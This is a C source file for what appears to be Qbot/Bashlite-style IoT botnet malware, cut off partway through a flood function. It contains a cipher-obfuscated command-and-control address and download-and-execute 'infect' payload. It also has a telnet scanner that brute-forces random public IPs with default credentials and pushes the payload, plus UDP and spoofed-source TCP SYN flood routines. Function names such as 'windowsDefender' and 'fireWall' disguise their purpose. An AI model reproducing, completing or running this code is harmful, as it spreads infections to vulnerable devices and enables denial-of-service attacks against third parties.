//     ___      __ _
//    /   \___ / _(_)_ __   ___  ___
//   / /\ / _ \ |_| | '_ \ / _ \/ __|
//  / /_//  __/  _| | | | |  __/\__ \
// /___,' \___|_| |_|_| |_|\___||___/

#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

//   _____            _           _
//   \_   \_ __   ___| |_   _  __| | ___  ___
//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
//    ___             __ _
//   / __\___  _ __  / _(_) __ _
//  / /  / _ \| '_ \| |_| |/ _` |
// / /__| (_) | | | |  _| | (_| |
// \____/\___/|_| |_|_| |_|\__, |
//                         |___/

unsigned char *commServer[] =
{
	">l:X>>$X@@$X>l.1,,,"
};
char *infect = "?=STzDwSddS?=STu*UTUv\"SddS?=ST=)uTxADSddS?=STD\"zZ^vxs^!qSz(zwS>l:X>>$X@@$X>l.SW?S|)zSz(zwXxASddSz(zwS>l:X>>$X@@$X>l.SW?S|)zSz(zwXxAZxASz(zwXxAZ^vxs^!qSz(zwSWUSz(zw@XxASW|S>l:X>>$X@@$X>l.SddSz(zwSWUSz(zw@XxASW|S>l:X>>$X@@$X>l.ZxASz(zw@XxAZ^vxs^!qSr|)zSAzzw1TT>l:X>>$X@@$X>l.T|z!wXxASddSr|)zSAzzw1TT>l:X>>$X@@$X>l.T|z!wXxAZ?AD!=SqS|z!wXxASddS^vxs^!qS?AD!=SqS|z!wXxAZxAS|z!wXxAU\"";

char encodes[] = { 
	'<', '>', '@', 'o', '$', ':', ',', '.', 'l', '+', '*', '^', '?', '=', ')', '(', 
	'|', 'A', 'B', '&', '%', ';', 'D', '"', '!', 'w', 'k', 'U', 'x', 'z', 'v', 'u', 
	't', 's', 'r', 'q', 'p', '_', 'n', 'm', '-', 'i', 'h', 'g', 'f', 'F', 'C', 'c', 
	'b', 'a', '~', 'K', '2', '3', '4', '5', '6', '7', '8', '9', 'e', 'y', 'd', '1',
    'X', 'S', 'N', 'Q', 'W', 'T', 'Z', 'M', 'I', 'R', 'H', 'G', 'V', 'O', 'Y', 'L',
    'j', 'P', 'J', 'E', '/', ']', '['
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
    'z', 'y', 'w', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 
    'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'X', '|', ':', 
    '.', ' ', '!', '#', '-', '/', ';', '&', '*', '\'', '\"', '\n', '\r', '\0', '>',
    '$', '%', '(', ')', ',', '?', '=', '@'
};



char *encode(char *str)
{
	int x = 0, i = 0, c;
    char encoded[512];
	memset(encoded, 0, sizeof(encoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(decodes); c++)
		{
			if(str[x] == decodes[c])
			{
				encoded[i] = encodes[c];
				i++;
			}
		}
		x++;
	}
	encoded[i] = '\0';
    char *ptrEncoded = strdup(encoded);
	return ptrEncoded;
}

char *decode(char *str)
{
	int x = 0, i = 0, c;
    char decoded[512];
	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
				decoded[i] = decodes[c];
				i++;
			}
		}
		x++;
	}
	decoded[i] = '\0';
    char *ptrDecoded = strdup(decoded);
	return ptrDecoded;
}
//    ___ _       _           _
//   / _ \ | ___ | |__   __ _| |___
//  / /_\/ |/ _ \| '_ \ / _` | / __|
// / /_\\| | (_) | |_) | (_| | \__ \
// \____/|_|\___/|_.__/ \__,_|_|___/

int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr winwin;
//struct in_addr ourIP;
//root admin guest
//\0 root admin 1234 12345
char *usernames[] = {"U!!zVGO", "*=DB\"VGO", "|v)xzVGO"};
char *passwords[] = {"VGO", "U!!zVGO", "*=DB\"VGO", ">@o$VGO", ">@o$:VGO"};

#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

in_addr_t windowsDefender(in_addr_t netmask)
{
	in_addr_t tmp = ntohl(winwin.s_addr) & netmask;
	return tmp ^ ( rand_cmwc() & ~netmask);
}

void fireWall(char *str)
{
	int i;
	int begin = 0;
	int end = strlen(str) - 1;

	while (isspace(str[begin])) begin++;

	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];

	str[i - begin] = '\0';
}

static void startUp(unsigned char **str, int c)
{
	if (str) {
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}
static int conHost(unsigned char **out, const unsigned char *string, int width, int pad)
{
	register int pc = 0, padchar = ' ';

	if (width > 0) {
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) {
		for ( ; width > 0; --width) {
			startUp (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) {
		startUp (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) {
		startUp (out, padchar);
		++pc;
	}

	return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return conHost (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        startUp (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + conHost (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];

	for (; *format != 0; ++format) {
		if (*format == '%') {
			++format;
			width = pad = 0;
			if (*format == '\0') break;
			if (*format == '%') goto out;
			if (*format == '-') {
				++format;
				pad = PAD_RIGHT;
			}
			while (*format == '0') {
				++format;
				pad |= PAD_ZERO;
			}
			for ( ; *format >= '0' && *format <= '9'; ++format) {
				width *= 10;
				width += *format - '0';
			}
			if( *format == 's' ) {
				register char *s = (char *)va_arg( args, int );
				pc += conHost (out, s?s:decode("P\"v;;J"), width, pad);
				continue;
			}
			if( *format == 'd' ) {
				pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
				continue;
			}
			if( *format == 'x' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'X' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
				continue;
			}
			if( *format == 'u' ) {
				pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'c' ) {
				scr[0] = (unsigned char)va_arg( args, int );
				scr[1] = '\0';
				pc += conHost (out, scr, width, pad);
				continue;
			}
		}
		else {
out:
			startUp (out, *format);
			++pc;
		}
	}
	if (out) **out = '\0';
	va_end( args );
	return pc;
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
	va_list args;
	va_start( args, format );
	return print(&out, format, args );
}


int sockprintf(int sock, char *formatStr, ...)
{
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
	register int iop;
	int pdes[2], fds, pid;

	if (*type != 'r' && *type != 'w' || type[1]) return -1;

	if (pipe(pdes) < 0) return -1;
	if (fdopen_pids == NULL) {
		if ((fds = getdtablesize()) <= 0) return -1;
		if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
		memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
	}

	switch (pid = vfork())
	{
	case -1:
		close(pdes[0]);
		close(pdes[1]);
		return -1;
	case 0:
		if (*type == 'r') {
			if (pdes[1] != 1) {
				dup2(pdes[1], 1);
				close(pdes[1]);
			}
			close(pdes[0]);
		} else {
			if (pdes[0] != 0) {
				(void) dup2(pdes[0], 0);
				(void) close(pdes[0]);
			}
			(void) close(pdes[1]);
		}
		execl(decode("T^B\"TxA"), decode("xA"), decode("W?"), program, NULL);
		_exit(127);
	}
	if (*type == 'r') {
		iop = pdes[0];
		(void) close(pdes[1]);
	} else {
		iop = pdes[1];
		(void) close(pdes[0]);
	}
	fdopen_pids[iop] = pid;
	return (iop);
}

int explorer(int iop)
{
	register int fdes;
	sigset_t omask, nmask;
	int pstat;
	register int pid;

	if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
	(void) close(iop);
	sigemptyset(&nmask);
	sigaddset(&nmask, SIGINT);
	sigaddset(&nmask, SIGQUIT);
	sigaddset(&nmask, SIGHUP);
	(void) sigprocmask(SIG_BLOCK, &nmask, &omask);
	do {
		pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
	} while (pid == -1 && errno == EINTR);
	(void) sigprocmask(SIG_SETMASK, &omask, NULL);
	fdopen_pids[fdes] = 0;
	return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *SYSWOW64(unsigned char *buffer, int bufferSize, int fd)
{
	int got = 1, total = 0;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got == 0 ? NULL : buffer;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
	struct hostent *h;
	if((i->s_addr = inet_addr(toGet)) == -1) return 1;
	return 0;
}

void winhost(unsigned char *buf, int length)
{
	int i = 0;
	for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
	memset(buf, 0, bufsize);

	fd_set myset;
	struct timeval tv;
	tv.tv_sec = 30;
	tv.tv_usec = 0;
	FD_ZERO(&myset);
	FD_SET(socket, &myset);
	int selectRtn, retryCount;
	if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
		while(retryCount < 10)
		{
			sockprintf(mainCommSock, "Kfah");

			tv.tv_sec = 30;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(socket, &myset);
			if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
				retryCount++;
				continue;
			}

			break;
		}
	}

	unsigned char tmpchr;
	unsigned char *cp;
	int count = 0;

	cp = buf;
	while(bufsize-- > 1)
	{
		if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
			*cp = 0x00;
			return -1;
		}
		*cp++ = tmpchr;
		if(tmpchr == '\n') break;
		count++;
	}
	*cp = 0x00;

	return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
	struct sockaddr_in dest_addr;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;

	int valopt;
	long arg = fcntl(fd, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(fd, F_SETFL, arg);

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(host, &dest_addr.sin_addr)) return 0;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

	if (res < 0) {
		if (errno == EINPROGRESS) {
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(fd, &myset);
			if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
				lon = sizeof(int);
				getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
				if (valopt) return 0;
			}
			else return 0;
		}
		else return 0;
	}

	arg = fcntl(fd, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(fd, F_SETFL, arg);

	return 1;
}

int winFork()
{
	uint32_t parent, *newpids, i;
	parent = fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids = (uint32_t*)malloc((numpids + 1) * 4);
	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
	newpids[numpids - 1] = parent;
	free(pids);
	pids = newpids;
	return parent;
}

int winneg(int sock, unsigned char *buf, int len)
{
	unsigned char c;

	switch (buf[1]) {
	case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
	case CMD_WILL:
	case CMD_WONT:
	case CMD_DO:
	case CMD_DONT:
		c = CMD_IAC;
		send(sock, &c, 1, MSG_NOSIGNAL);
		if (CMD_WONT == buf[1]) c = CMD_DONT;
		else if (CMD_DONT == buf[1]) c = CMD_WONT;
		else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
		else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
		send(sock, &c, 1, MSG_NOSIGNAL);
		send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
		break;

	default:
		break;
	}

	return 0;
}

int matchRegistry(char *bufStr)
{
	char *prompts = ">$#~\0";

	int bufLen = strlen(bufStr);
	int i, q = 0;
	for(i = 0; i < strlen(prompts); i++)
	{
		while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
		if(*(bufStr + bufLen - q) == prompts[i]) return 1;
	}

	return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
	int bufferUsed = initialIndex, got = 0, found = 0;
	fd_set myset;
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = timeoutusec;
	unsigned char *initialRead = NULL;

	while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
	{
		FD_ZERO(&myset);
		FD_SET(fd, &myset);
		if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
		initialRead = buffer + bufferUsed;
		got = recv(fd, initialRead, 1, 0);
		if(got == -1 || got == 0) return 0;
		bufferUsed += got;
		if(*initialRead == 0xFF)
		{
			got = recv(fd, initialRead + 1, 2, 0);
			if(got == -1 || got == 0) return 0;
			bufferUsed += got;
			if(!winneg(fd, initialRead, 3)) return 0;
		} else {
			if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchRegistry(buffer))) { found = 1; break; }
		}
	}

	if(found) return 1;
	return 0;
}

static uint8_t ipState[5] = {0}; //starting from 1 becuz yolo
//getrandompublicip
in_addr_t windows()
{
	if(ipState[1] > 0 && ipState[4] < 255)
	{
		ipState[4]++;
		char ip[16] = {0};
		szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
		return inet_addr(ip);
	}

	ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;
	ipState[3] = rand() % 255;
	ipState[4] = 0;
	while(
		(ipState[1] == 0) ||
		(ipState[1] == 10) ||
		(ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
		(ipState[1] == 127) ||
		(ipState[1] == 169 && ipState[2] == 254) ||
		(ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
		(ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
		(ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
		(ipState[1] == 192 && ipState[2] == 168) ||
		(ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
		(ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
		(ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
		(ipState[1] >= 224)
	)
	{
		ipState[1] = rand() % 255;
		ipState[2] = rand() % 255;
		ipState[3] = rand() % 255;
	}

	char ip[16] = {0};
	szprintf(ip, "%d.%d.%d.0", ipState[1], ipState[2], ipState[3]);
	return inet_addr(ip);
}


unsigned short Hitler (unsigned short *buf, int count)
{
	register uint64_t sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (uint16_t)(~sum);
}

unsigned short Stalin(struct iphdr *iph, struct tcphdr *tcph)
{

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = Hitler(tcp,totaltcp_len);
	free(tcp);
	return output;
}

void Rasputin(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}

int sclose(int fd)
{
	if(3 > fd) return 1;
	close(fd);
	return 0;
}

void Scanner()
{
	int max = (getdtablesize() / 4) * 3, i, res;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt;


	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(23);
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct telstate_t
	{
		int fd;
		uint32_t ip;
		uint8_t state;
		uint8_t complete;
		uint8_t usernameInd;
		uint8_t passwordInd;
		uint32_t totalTimeout;
		uint16_t bufUsed;
		char *sockbuf;
	} fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));
	for(i = 0; i < max; i++) { fds[i].complete = 1; fds[i].sockbuf = malloc(1024); memset(fds[i].sockbuf, 0, 1024); fds[i].state = 0; fds[i].passwordInd = 0; fds[i].usernameInd = 0;fds[i].bufUsed = 0;}

	while(1)
	{
		for(i = 0; i < max; i++)
		{
			switch(fds[i].state)
			{
			case 0:
				{
					memset(fds[i].sockbuf, 0, 1024);

					if(fds[i].complete) { char *tmp = fds[i].sockbuf; memset(&(fds[i]), 0, sizeof(struct telstate_t)); fds[i].sockbuf = tmp; fds[i].ip = windows(); }
					else {
						fds[i].passwordInd++;
						if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) { fds[i].passwordInd = 0; fds[i].usernameInd++; }
						if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) { fds[i].complete = 1; continue; }
					}
					dest_addr.sin_family = AF_INET;
					dest_addr.sin_port = htons(23);
					memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
					dest_addr.sin_addr.s_addr = fds[i].ip;
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					if(fds[i].fd == -1) { continue; }
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) { sclose(fds[i].fd); fds[i].complete = 1; }
					else { fds[i].state = 1; fds[i].totalTimeout = 0; }
				}
				break;

			case 1:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
					if(res == 1)
					{
						lon = sizeof(int);
						valopt = 0;
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							sclose(fds[i].fd);
							fds[i].state = 0;
							fds[i].complete = 1;
						} else {
							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
							fds[i].totalTimeout = 0;
							fds[i].bufUsed = 0;
							memset(fds[i].sockbuf, 0, 1024);
							fds[i].state = 2;
							continue;
						}
					} else if(res == -1)
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}

					if(fds[i].totalTimeout + 10 < time(NULL))
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
				}
				break;

			case 2:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

					if(readUntil(fds[i].fd, decode("!|B\""), 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						memset(fds[i].sockbuf, 0, 1024); 
						fds[i].state = 3;
						continue;
					} else {
						fds[i].bufUsed = strlen(fds[i].sockbuf);
					}

					if(fds[i].totalTimeout + 30 < time(NULL))
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
				}
				break;

			case 3:
				{
					if(send(fds[i].fd, decode(usernames[fds[i].usernameInd]), strlen(usernames[fds[i].usernameInd])-1, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 4;
				}
				break;

			case 4:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

					if(readUntil(fds[i].fd, decode("*xxr!U="), 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						if(strstr(fds[i].sockbuf, decode("*xxr!U=")) != NULL) fds[i].state = 5;
						else fds[i].state = 7;
						memset(fds[i].sockbuf, 0, 1024);
						continue;
					} else {
						if(strstr(fds[i].sockbuf, decode("!|B\"")) != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
						fds[i].bufUsed = strlen(fds[i].sockbuf);
					}

					if(fds[i].totalTimeout + 30 < time(NULL))
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
				}
				break;

			case 5:
				{
					if(send(fds[i].fd, decode(passwords[fds[i].passwordInd]), strlen(passwords[fds[i].passwordInd])-1, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 6;
				}
				break;

			case 6:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

					if(readUntil(fds[i].fd, decode("!|B\""), 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						if(strstr(fds[i].sockbuf, decode("!|B\"")) != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
	 					if(!matchRegistry(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
						else fds[i].state = 7;
						memset(fds[i].sockbuf, 0, 1024);
						continue;
					} else {
						fds[i].bufUsed = strlen(fds[i].sockbuf);
					}

					if(fds[i].totalTimeout + 30 < time(NULL))
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
				}
				break;

			case 7:
				{
					if(send(fds[i].fd, decode("xAVG"), 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                    if(send(fds[i].fd, decode("xA);;VG"), 7, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 8;
				}
				break;
			
			case 8:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
					if(send(fds[i].fd, decode(infect), strlen(infect), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
					if(fds[i].totalTimeout + 45 < time(NULL))
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
                        continue;
					}
				}
				break;
			}
		}
	}
}
void sendUDP(unsigned char *target, int port, int timeEnd)
{
	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	register unsigned int pollRegister;
	pollRegister = 10;
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sockfd)
    {
        return;
    }

    unsigned char *buf = (unsigned char *)malloc(1000 + 1);
    if(buf == NULL) return;
    memset(buf, 0, 1000 + 1);
    winhost(buf, 1000);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1)
    {
        sendto(sockfd, buf, 1000, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if(i == pollRegister)
        {
            if(port == 0) dest_addr.sin_port = rand_cmwc();
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}
void sendTCP(unsigned char *target, int port, int timeEnd)
{
	register unsigned int pollRegister;
	pollRegister = 10;

	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd)
	{
		return;
	}

	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
	{
		return;
	}

	in_addr_t netmask;
    netmask = ( ~((1 << (32 - 32)) - 1) );

	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + 0];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	Rasputin(iph, dest_addr.sin_addr.s_addr, htonl( windowsDefender(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + 0);

	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;
    tcph->syn = 1;

	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = Stalin(iph, tcph);

	iph->check = Hitler ((unsigned short *) packet, iph->tot_len);

	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while(1)
	{
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		iph->saddr = htonl( windowsDefender(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = Stalin(iph, tcph);
		iph->check = Hitler ((unsigned short *) packet, iph->tot_len);

		if(i == pollRegister)
		{
			if(time(NULL) > end) break;
			i = 0;
			continue;
		}
		i++;
	}
}

void sendHold(unsigned char *ip, int port, int end_time)
{

	int max = getdtablesize() / 2, i;

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
